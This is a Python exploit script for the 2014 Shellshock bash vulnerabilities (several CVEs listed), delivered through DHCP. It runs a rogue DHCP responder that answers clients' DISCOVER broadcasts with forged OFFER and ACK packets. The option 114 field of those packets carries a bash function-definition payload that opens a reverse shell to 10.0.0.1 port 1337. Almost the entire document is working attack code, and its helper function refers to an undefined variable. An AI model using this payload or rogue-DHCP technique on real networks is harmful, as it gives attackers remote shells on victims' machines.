#!/usr/bin/python
# Exploit Title: dhclient shellshocker
# Google Dork: n/a
# Date: 10/1/14
# Exploit Author: @0x00string
# Vendor Homepage: gnu.org
# Software Link: http://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz
# Version: 4.3.11
# Tested on: Ubuntu 14.04.1
# CVE : CVE-2014-6277,CVE-2014-6278,CVE-2014-7169,CVE-2014-7186,CVE-2014-7187
#  ______        ______  ______                 _                  
# / __   |      / __   |/ __   |     _         (_)                 
#| | //| |_   _| | //| | | //| | ___| |_   ____ _ ____   ____  ___ 
#| |// | ( \ / ) |// | | |// | |/___)  _) / ___) |  _ \ / _  |/___)
#|  /__| |) X (|  /__| |  /__| |___ | |__| |   | | | | ( ( | |___ |
# \_____/(_/ \_)\_____/ \_____/(___/ \___)_|   |_|_| |_|\_|| (___/ 
#                                                      (_____|     
#     _ _           _ _                  
#    | | |         | (_)            _    
#  _ | | | _   ____| |_  ____ ____ | |_  
# / || | || \ / ___) | |/ _  )  _ \|  _) 
#( (_| | | | ( (___| | ( (/ /| | | | |__ 
# \____|_| |_|\____)_|_|\____)_| |_|\___)                                        
#
#      _           _ _      _                 _                
#     | |         | | |    | |               | |               
#  ___| | _   ____| | | ___| | _   ___   ____| |  _ ____  ____ 
# /___) || \ / _  ) | |/___) || \ / _ \ / ___) | / ) _  )/ ___)
#|___ | | | ( (/ /| | |___ | | | | |_| ( (___| |< ( (/ /| |    
#(___/|_| |_|\____)_|_(___/|_| |_|\___/ \____)_| \_)____)_|    

# this buddy listens for clients performing a DISCOVER, a later version will exploit periodic REQUESTs, which can sometimes be prompted by causing IP conflicts
# once a broadcast DISCOVER packet has been detected, the XID, MAC and requested IP are pulled from the pack and a corresponding OFFER and ACK are generated and pushed out
# The client is expected to reject the offer in preference of their known DHCP server, but will still process the packet, triggering the vulnerability.
# can use option 114, 56 or 61, though is hardcoded to use 114 as this is merely a quick and dirty example.

import socket, struct
def HexToByte( hexStr ): 
    b = []
    h = ''.join( h.split(" ") )
    for i in range(0, len(h), 2):
        b.append( chr( int (h[i:i+2], 16 ) ) )
    return ''.join( b )

rport = 68
lport = 67

bsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bsock.bind(("<broadcast>", lport))

while True:

	OP = "72" # 56, Message - RFC 1533,2132. 61, Client-identifier - RFC 1533,2132,4361 or 114, URL - RFC 3679 are currently known to work, here we use 114
	URL = "() { :;}; bash -i >& /dev/tcp/10.0.0.1/1337 0>&1".encode("hex")
	URLLEN = chr(len(URL) / 2).encode("hex")
	END = "03040a000001ff"
	broadcast_get, (bcrhost, rport) = bsock.recvfrom(2048)
	hexip = broadcast_get[245:249]
	rhost = str(ord(hexip[0])) + "." + str(ord(hexip[1])) + "." + str(ord(hexip[2])) + "." + str(ord(hexip[3]))
	XID = broadcast_get[4:8].encode("hex")
	chaddr = broadcast_get[29:34].encode("hex")
	print "[+]\tgot broadcast with XID " + XID + " requesting IP " + rhost + "\n"
	OFFER = "02010600" + XID + "00000000000000000a0000430a0000010000000000" + chaddr + "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006382536335010236040a000001330400000e103a04000007083b0400000c4e0104ffffff001c040a0000ff06040a0000010f034c4f4c0c076578616d706c65" + OP + URLLEN + URL + END
	OFFER_BYTES = HexToByte(OFFER)
	ACK = "02010600" + XID + "00000000000000000a0000430a0000010000000000" + chaddr + "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006382536335010536040a000001330400000e103a04000007083b0400000c4e0104ffffff001c040a0000ff06040a0000010f034c4f4c0c076578616d706c65" + OP + URLLEN + URL + END
	ACK_BYTES = HexToByte(ACK)
	print "[+]\tsending evil offer\n"
	sock.sendto(OFFER_BYTES, (rhost, rport))
	broadcast_get2 = bsock.recvfrom(2048)
	print "[+]\tassuming request was received, sending ACK\n"
	sock.sendto(ACK_BYTES, (rhost, rport))

